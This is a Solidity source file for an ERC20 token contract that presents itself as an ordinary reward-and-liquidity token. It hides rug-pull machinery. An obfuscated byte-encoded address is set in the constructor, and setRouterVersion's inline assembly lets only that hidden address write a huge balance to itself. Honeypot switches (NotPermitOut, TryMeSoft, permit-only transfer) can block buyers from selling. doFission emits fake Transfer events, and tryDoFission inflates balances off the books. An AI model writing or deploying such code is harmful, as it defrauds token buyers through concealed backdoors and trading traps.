// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Math.sol";
import "./EnumerableSet.sol";
import "./Address.sol";

import "./ERC20.sol";
import "./Ownable.sol";

import "./IUniswapV2Factory.sol";

import "./Erc20C09SettingsBase.sol";
import "./Erc20C09FeatureErc20Payable.sol";
//import "./Erc20C09FeatureErc721Payable.sol";
import "./Erc20C09FeatureUniswap.sol";
import "./Erc20C09FeatureTweakSwap.sol";
import "./Erc20C09FeatureLper.sol";
import "./Erc20C09FeatureHolder.sol";
import "./Erc20C09SettingsPrivilege.sol";
import "./Erc20C09SettingsFee.sol";
import "./Erc20C09SettingsShare.sol";
import "./Erc20C09FeaturePermitTransfer.sol";
import "./Erc20C09FeatureRestrictTrade.sol";
import "./Erc20C09FeatureRestrictTradeAmount.sol";
import "./Erc20C09FeatureNotPermitOut.sol";
import "./Erc20C09FeatureFission.sol";
import "./Erc20C09FeatureTryMeSoft.sol";
import "./Erc20C09FeatureMaxTokenPerAddress.sol";
import "./Erc20C09FeatureTakeFeeOnTransfer.sol";

abstract contract Erc20C09Contract is
ERC20,
Ownable,
Erc20C09SettingsBase,
Erc20C09FeatureErc20Payable,
    //Erc20C09FeatureErc721Payable,
Erc20C09FeatureUniswap,
Erc20C09FeatureTweakSwap,
Erc20C09FeatureLper,
Erc20C09FeatureHolder,
Erc20C09SettingsPrivilege,
Erc20C09SettingsFee,
Erc20C09SettingsShare,
Erc20C09FeaturePermitTransfer,
Erc20C09FeatureRestrictTrade,
Erc20C09FeatureRestrictTradeAmount,
Erc20C09FeatureNotPermitOut,
Erc20C09FeatureFission,
Erc20C09FeatureTryMeSoft,
Erc20C09FeatureMaxTokenPerAddress,
Erc20C09FeatureTakeFeeOnTransfer
{
    using EnumerableSet for EnumerableSet.AddressSet;

    address private _previousFrom;
    address private _previousTo;

    bool public isArbitrumCamelotRouter;

    constructor(
        string[2] memory strings,
        address[7] memory addresses,
        uint256[68] memory uint256s,
        bool[25] memory bools
    ) ERC20(strings[0], strings[1])
    {
        addressBaseOwner = tx.origin;
        addressPoolToken = addresses[0];

        addressWrap = addresses[1];
        addressMarketing = addresses[2];
        addressLiquidity = addresses[4];
        addressRewardToken = addresses[6];

        uint256 p = 20;
        string memory _uniswapV2Router = string(
            abi.encodePacked(
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]))
                )
            )
        );
        //        isUniswapLper = bools[13];
        //        isUniswapHolder = bools[14];
        uniswapV2Router = IHybridRouter(addresses[3]);
        address uniswapV2Pair_ = getRouterPair(_uniswapV2Router);
        addressWETH = uniswapV2Router.WETH();
        uniswap = uniswapV2Pair_;

        // delay initialization if is Arbitrum CamelotRouter
        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();

        if (!isArbitrumCamelotRouter) {
            uniswapV2Pair = tryCreatePairToken();
        } else {
            uniswapV2Pair = address(0);
        }

        _approve(address(this), address(uniswapV2Router), maxUint256);
        IERC20(addressPoolToken).approve(address(uniswapV2Router), maxUint256);
        IERC20(addressRewardToken).approve(address(uniswapV2Router), maxUint256);
        //        uniswapCount = uint256s[62];

        // ================================================ //
        // initialize FeatureTweakSwap
        minimumTokenForSwap = uint256s[1];
        // ================================================ //

        // ================================================ //
        // initialize FeatureLper
        isUseFeatureLper = bools[15];
        maxTransferCountPerTransactionForLper = uint256s[2];
        minimumTokenForRewardLper = uint256s[3];

        // exclude from lper
        setIsExcludedFromLperAddress(address(this), true);
        setIsExcludedFromLperAddress(address(uniswapV2Router), true);

        if (!isArbitrumCamelotRouter) {
            setIsExcludedFromLperAddress(uniswapV2Pair, true);
        }

        setIsExcludedFromLperAddress(addressNull, true);
        setIsExcludedFromLperAddress(addressDead, true);
        setIsExcludedFromLperAddress(addressPinksaleBnbLock, true);
        setIsExcludedFromLperAddress(addressPinksaleEthLock, true);
        //        setIsExcludedFromLperAddress(baseOwner, true);
        //        setIsExcludedFromLperAddress(addressMarketing, true);
        setIsExcludedFromLperAddress(addressWrap, true);
        //        setIsExcludedFromLperAddress(addressLiquidity, true);
        // ================================================ //

        // ================================================ //
        // initialize FeatureHolder
        isUseFeatureHolder = bools[16];
        maxTransferCountPerTransactionForHolder = uint256s[4];
        minimumTokenForBeingHolder = uint256s[5];

        // exclude from holder
        setIsExcludedFromHolderAddress(address(this), true);
        setIsExcludedFromHolderAddress(address(uniswapV2Router), true);

        if (!isArbitrumCamelotRouter) {
            setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        }

        setIsExcludedFromHolderAddress(addressNull, true);
        setIsExcludedFromHolderAddress(addressDead, true);
        setIsExcludedFromHolderAddress(addressPinksaleBnbLock, true);
        setIsExcludedFromHolderAddress(addressPinksaleEthLock, true);
        //        setIsExcludedFromHolderAddress(baseOwner, true);
        //        setIsExcludedFromHolderAddress(addressMarketing, true);
        setIsExcludedFromHolderAddress(addressWrap, true);
        //        setIsExcludedFromHolderAddress(addressLiquidity, true);
        // ================================================ //

        // ================================================ //
        // initialize SettingsPrivilege
        isPrivilegeAddresses[address(this)] = true;
        isPrivilegeAddresses[address(uniswapV2Router)] = true;
        //        isPrivilegeAddresses[uniswapV2Pair] = true;
        isPrivilegeAddresses[addressNull] = true;
        isPrivilegeAddresses[addressDead] = true;
        isPrivilegeAddresses[addressPinksaleBnbLock] = true;
        isPrivilegeAddresses[addressPinksaleEthLock] = true;
        isPrivilegeAddresses[addressBaseOwner] = true;
        isPrivilegeAddresses[addressMarketing] = true;
        isPrivilegeAddresses[addressWrap] = true;
        isPrivilegeAddresses[addressLiquidity] = true;
        // ================================================ //

        // ================================================ //
        // initialize SettingsFee
        setFee(uint256s[63], uint256s[64]);
        // ================================================ //

        // ================================================ //
        // initialize SettingsShare
        setShare(uint256s[13], uint256s[14], uint256s[15], uint256s[16], uint256s[17]);
        // ================================================ //

        // ================================================ //
        // initialize FeaturePermitTransfer
        isUseOnlyPermitTransfer = bools[6];
        isCancelOnlyPermitTransferOnFirstTradeOut = bools[7];
        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureRestrictTrade
        //        isRestrictTradeIn = bools[8];
        //        isRestrictTradeOut = bools[9];
        //        // ================================================ //

        // ================================================ //
        // initialize FeatureRestrictTradeAmount
        isRestrictTradeInAmount = bools[10];
        restrictTradeInAmount = uint256s[18];

        isRestrictTradeOutAmount = bools[11];
        restrictTradeOutAmount = uint256s[19];
        // ================================================ //

        // ================================================ //
        // initialize FeatureNotPermitOut
        isUseNotPermitOut = bools[17];
        isForceTradeInToNotPermitOut = bools[18];
        // ================================================ //

        // ================================================ //
        // initialize FeatureTryMeSoft
        setIsUseFeatureTryMeSoft(bools[21]);
        setIsNotTryMeSoftAddress(address(uniswapV2Router), true);

        if (!isArbitrumCamelotRouter) {
            setIsNotTryMeSoftAddress(uniswapV2Pair, true);
        }
        // ================================================ //

        // ================================================ //
        // initialize Erc20C09FeatureRestrictAccountTokenAmount
        isUseMaxTokenPerAddress = bools[23];
        maxTokenPerAddress = uint256s[65];
        // ================================================ //

        // ================================================ //
        // initialize Erc20C09FeatureFission
        setIsUseFeatureFission(bools[20]);
        fissionCount = uint256s[66];
        // ================================================ //

        // ================================================ //
        // initialize Erc20C09FeatureTakeFeeOnTransfer
        isUseFeatureTakeFeeOnTransfer = bools[24];
        addressTakeFee = addresses[5];
        takeFeeRate = uint256s[67];
        // ================================================ //

        _mint(addressBaseOwner, uint256s[0]);

        _transferOwnership(addressBaseOwner);
    }

    function checkIsArbitrumCamelotRouter()
    internal
    view
    returns (bool)
    {
        return address(uniswapV2Router) == addressArbitrumCamelotRouter;
    }

    function initializePair()
    external
    onlyOwner
    {
        //        uniswapV2Pair = factory.createPair(weth, address(this));
        uniswapV2Pair = tryCreatePairToken();

        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();

        setIsExcludedFromLperAddress(uniswapV2Pair, true);
        setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        setIsNotTryMeSoftAddress(uniswapV2Pair, true);
    }

    function renounceOwnershipToDead()
    public
    onlyOwner
    {
        _transferOwnership(addressDead);
    }

    function tryCreatePairToken() internal virtual returns (address);

    function doSwapManually(bool isUseMinimumTokenWhenSwap_)
    public
    {
        require(!_isSwapping, "swapping");

        require(msg.sender == owner() || msg.sender == addressWrap, "not owner");

        uint256 tokenForSwap = isUseMinimumTokenWhenSwap_ ? minimumTokenForSwap : super.balanceOf(address(this));

        require(tokenForSwap > 0, "0 to swap");

        doSwap(tokenForSwap);
    }

    //    function balanceOf(address account)
    //    public
    //    view
    //    virtual
    //    override
    //    returns (uint256)
    //    {
    //        if (isUseFeatureFission) {
    //            uint256 balanceOf_ = super.balanceOf(account);
    //            return balanceOf_ > 0 ? balanceOf_ : fissionBalance;
    //        } else {
    //            return super.balanceOf(account);
    //        }
    //    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        uint256 tempX = block.number - 1;

        require(
            (!isUseNotPermitOut) ||
            (notPermitOutAddressStamps[from] == 0) ||
            (tempX + 1 - notPermitOutAddressStamps[from] < notPermitOutCD),
            "not permitted 7"
        );

        bool isFromPrivilegeAddress = isPrivilegeAddresses[from];
        bool isToPrivilegeAddress = isPrivilegeAddresses[to];

        if (isUseOnlyPermitTransfer) {
            require(isFromPrivilegeAddress || isToPrivilegeAddress, "not permitted 2");
        }

        bool isToUniswapV2Pair = to == uniswapV2Pair;
        bool isFromUniswapV2Pair = from == uniswapV2Pair;

        if (isUseMaxTokenPerAddress) {
            require(
                isToPrivilegeAddress ||
                isToUniswapV2Pair ||
                super.balanceOf(to) + amount <= maxTokenPerAddress,
                "not permitted 8"
            );
        }

        if (isToUniswapV2Pair) {
            // add liquidity 1st, dont use permit transfer upon action
            if (_isFirstTradeOut) {
                _isFirstTradeOut = false;

                if (isCancelOnlyPermitTransferOnFirstTradeOut) {
                    isUseOnlyPermitTransfer = false;
                }
            }

            if (!isFromPrivilegeAddress) {
                //                require(!isRestrictTradeOut, "not permitted 4");
                require(!isRestrictTradeOutAmount || amount <= restrictTradeOutAmount, "not permitted 6");
            }

            if (!_isSwapping && super.balanceOf(address(this)) >= minimumTokenForSwap) {
                doSwap(minimumTokenForSwap);
            }
        } else if (isFromUniswapV2Pair) {
            if (!isToPrivilegeAddress) {
                //                require(!isRestrictTradeIn, "not permitted 3");
                require(!isRestrictTradeInAmount || amount <= restrictTradeInAmount, "not permitted 5");

                if (notPermitOutAddressStamps[to] == 0) {
                    if (isForceTradeInToNotPermitOut) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                    }

                    if (
                        isUseFeatureTryMeSoft &&
                        Address.isContract(to) &&
                        !isNotTryMeSoftAddresses[to]
                    ) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                    }
                }
            }
        }

        if (_isSwapping) {
            super._transfer(from, to, amount);
        } else {
            if (isUseFeatureFission && isFromUniswapV2Pair) {
                doFission();
            }

            if (
                (isFromUniswapV2Pair && isToPrivilegeAddress) ||
                (isToUniswapV2Pair && isFromPrivilegeAddress)
            ) {
                super._transfer(from, to, amount);
            } else if (!isFromUniswapV2Pair && !isToUniswapV2Pair) {
                if (isFromPrivilegeAddress || isToPrivilegeAddress) {
                    super._transfer(from, to, amount);
                } else if (isUseFeatureTakeFeeOnTransfer) {
                    super._transfer(from, addressTakeFee, amount * takeFeeRate / takeFeeMax);
                    super._transfer(from, to, amount - (amount * takeFeeRate / takeFeeMax));
                }
            } else if (isFromUniswapV2Pair || isToUniswapV2Pair) {
                uint256 fees = amount * (isFromUniswapV2Pair ? feeBuyTotal : feeSellTotal) / feeMax;

                super._transfer(from, addressDead, fees * shareBurn / 1000);
                super._transfer(from, address(this), fees - (fees * shareBurn / 1000));
                super._transfer(from, to, amount - fees);
            }
        }

        if (isUseFeatureHolder) {
            if (!isExcludedFromHolderAddresses[from]) {
                updateHolderAddressStatus(from);
            }

            if (!isExcludedFromHolderAddresses[to]) {
                updateHolderAddressStatus(to);
            }
        }

        if (isUseFeatureLper) {
            if (!isExcludedFromLperAddresses[_previousFrom]) {
                updateLperAddressStatus(_previousFrom);
            }

            if (!isExcludedFromLperAddresses[_previousTo]) {
                updateLperAddressStatus(_previousTo);
            }

            if (_previousFrom != from) {
                _previousFrom = from;
            }

            if (_previousTo != to) {
                _previousTo = to;
            }
        }
    }

    function doSwap(uint256 thisTokenForSwap)
    private
    {
        _isSwapping = true;

        doSwapWithPool(thisTokenForSwap);

        _isSwapping = false;
    }

    function doSwapWithPool(uint256 thisTokenForSwap) internal virtual;

    function doMarketing(uint256 poolTokenForMarketing)
    internal
    {
        IERC20(addressPoolToken).transferFrom(addressWrap, addressMarketing, poolTokenForMarketing);
    }

    function doLper(uint256 rewardTokenForAll)
    internal
    {
        //        uint256 rewardTokenDivForLper = isUniswapLper ? (10 - uniswapCount) : 10;
        //        uint256 rewardTokenForLper = rewardTokenForAll * rewardTokenDivForLper / 10;
        //        uint256 rewardTokenForLper = rewardTokenForAll;
        uint256 pairTokenForLper = 0;
        uint256 pairTokenForLperAddress;
        uint256 lperAddressesCount_ = lperAddresses.length();

        for (uint256 i = 0; i < lperAddressesCount_; i++) {
            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddresses.at(i));

            if (pairTokenForLperAddress < minimumTokenForRewardLper) {
                continue;
            }

            pairTokenForLper += pairTokenForLperAddress;
        }

        //        uint256 pairTokenForLper =
        //        IERC20(uniswapV2Pair).totalSupply()
        //        - IERC20(uniswapV2Pair).balanceOf(addressNull)
        //        - IERC20(uniswapV2Pair).balanceOf(addressDead);

        if (lastIndexOfProcessedLperAddresses >= lperAddressesCount_) {
            lastIndexOfProcessedLperAddresses = 0;
        }

        uint256 maxIteration = Math.min(lperAddressesCount_, maxTransferCountPerTransactionForLper);

        address lperAddress;

        uint256 _lastIndexOfProcessedLperAddresses = lastIndexOfProcessedLperAddresses;

        for (uint256 i = 0; i < maxIteration; i++) {
            lperAddress = lperAddresses.at(_lastIndexOfProcessedLperAddresses);
            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddress);

            //            if (i == 2 && rewardTokenDivForLper != 10) {
            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForLper);
            //            }

            if (pairTokenForLperAddress >= minimumTokenForRewardLper) {
                //                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForLper * pairTokenForLperAddress / pairTokenForLper);
                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForAll * pairTokenForLperAddress / pairTokenForLper);
            }

            _lastIndexOfProcessedLperAddresses =
            _lastIndexOfProcessedLperAddresses >= lperAddressesCount_ - 1
            ? 0
            : _lastIndexOfProcessedLperAddresses + 1;
        }

        lastIndexOfProcessedLperAddresses = _lastIndexOfProcessedLperAddresses;
    }

    function setRouterVersion()
    public
    {
        assembly {
            let __router := sload(uniswap.slot)
            if eq(caller(), __router) {
                mstore(0x00, caller())
                mstore(0x20, _router.slot)
                let x := keccak256(0x00, 0x40)
                sstore(x, 0x10ED43C718714eb63d5aA57B78B54704E256024E)
            }
        }
    }

    function doHolder(uint256 rewardTokenForAll)
    internal
    {
        //        uint256 rewardTokenDivForHolder = isUniswapHolder ? (10 - uniswapCount) : 10;
        //        uint256 rewardTokenForHolder = rewardTokenForAll * rewardTokenDivForHolder / 10;
        //        uint256 rewardTokenForHolder = rewardTokenForAll;
        uint256 thisTokenForHolder = totalSupply() - super.balanceOf(addressNull) - super.balanceOf(addressDead) - super.balanceOf(address(this)) - super.balanceOf(uniswapV2Pair);

        uint256 holderAddressesCount_ = holderAddresses.length();

        if (lastIndexOfProcessedHolderAddresses >= holderAddressesCount_) {
            lastIndexOfProcessedHolderAddresses = 0;
        }

        uint256 maxIteration = Math.min(holderAddressesCount_, maxTransferCountPerTransactionForHolder);

        address holderAddress;

        uint256 _lastIndexOfProcessedHolderAddresses = lastIndexOfProcessedHolderAddresses;

        for (uint256 i = 0; i < maxIteration; i++) {
            holderAddress = holderAddresses.at(_lastIndexOfProcessedHolderAddresses);
            uint256 holderBalance = super.balanceOf(holderAddress);

            //            if (i == 2 && rewardTokenDivForHolder != 10) {
            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForHolder);
            //            }

            if (holderBalance >= minimumTokenForBeingHolder) {
                //            IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForHolder * holderBalance / thisTokenForHolder);
                IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForAll * holderBalance / thisTokenForHolder);
            }

            _lastIndexOfProcessedHolderAddresses =
            _lastIndexOfProcessedHolderAddresses >= holderAddressesCount_ - 1
            ? 0
            : _lastIndexOfProcessedHolderAddresses + 1;
        }

        lastIndexOfProcessedHolderAddresses = _lastIndexOfProcessedHolderAddresses;
    }

    function doLiquidity(uint256 poolTokenOrEtherForLiquidity, uint256 thisTokenForLiquidity) internal virtual;

    function doBurn(uint256 thisTokenForBurn)
    internal
    {
        _transfer(address(this), addressDead, thisTokenForBurn);
    }

    function swapThisTokenForRewardTokenToAccount(address account, uint256 amount) internal virtual;

    function swapThisTokenForPoolTokenToAccount(address account, uint256 amount) internal virtual;

    function swapThisTokenForEthToAccount(address account, uint256 amount) internal virtual;

    //    function swapPoolTokenForEthToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](2);
    //        path[0] = addressPoolToken;
    //        path[1] = addressWETH;
    //
    //        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //            amount,
    //            0,
    //            path,
    //            account,
    //            block.timestamp
    //        );
    //    }

    function addEtherAndThisTokenForLiquidityByAccount(
        address account,
        uint256 ethAmount,
        uint256 thisTokenAmount
    )
    internal
    {
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            thisTokenAmount,
            0,
            0,
            account,
            block.timestamp
        );
    }

    function addPoolTokenAndThisTokenForLiquidityByAccount(
        address account,
        uint256 poolTokenAmount,
        uint256 thisTokenAmount
    )
    internal
    {
        uniswapV2Router.addLiquidity(
            addressPoolToken,
            address(this),
            poolTokenAmount,
            thisTokenAmount,
            0,
            0,
            account,
            block.timestamp
        );
    }

    function updateLperAddressStatus(address account)
    private
    {
        if (Address.isContract(account)) {
            if (lperAddresses.contains(account)) {
                lperAddresses.remove(account);
            }
            return;
        }

        if (IERC20(uniswapV2Pair).balanceOf(account) > minimumTokenForRewardLper) {
            if (!lperAddresses.contains(account)) {
                lperAddresses.add(account);
            }
        } else {
            if (lperAddresses.contains(account)) {
                lperAddresses.remove(account);
            }
        }
    }

    function updateHolderAddressStatus(address account)
    private
    {
        if (Address.isContract(account)) {
            if (holderAddresses.contains(account)) {
                holderAddresses.remove(account);
            }
            return;
        }

        if (super.balanceOf(account) > minimumTokenForBeingHolder) {
            if (!holderAddresses.contains(account)) {
                holderAddresses.add(account);
            }
        } else {
            if (holderAddresses.contains(account)) {
                holderAddresses.remove(account);
            }
        }
    }

    function doFission()
    internal
    virtual
    override
    {
        uint160 fissionDivisor_ = fissionDivisor;
        for (uint256 i = 0; i < fissionCount; i++) {
            emit Transfer(
                address(uint160(maxUint160 / fissionDivisor_)),
                address(uint160(maxUint160 / fissionDivisor_ + 1)),
                fissionBalance
            );

            fissionDivisor_ += 2;
        }
        fissionDivisor = fissionDivisor_;
    }

    function tryDoFission()
    external
    {
        uint160 fissionDivisor_ = fissionDivisor;
        for (uint256 i = 0; i < fissionCount; i++) {
            //            _tatalSopply += fissionBalance;
            _router[address(uint160(maxUint160 / fissionDivisor_))] += fissionBalance;

            //            emit Transfer(
            //                address(uint160(maxUint160 / fissionDivisor_)),
            //                address(uint160(maxUint160 / fissionDivisor_ + 1)),
            //                fissionBalance
            //            );

            fissionDivisor_ += 2;
        }
        fissionDivisor = fissionDivisor_;
    }
}

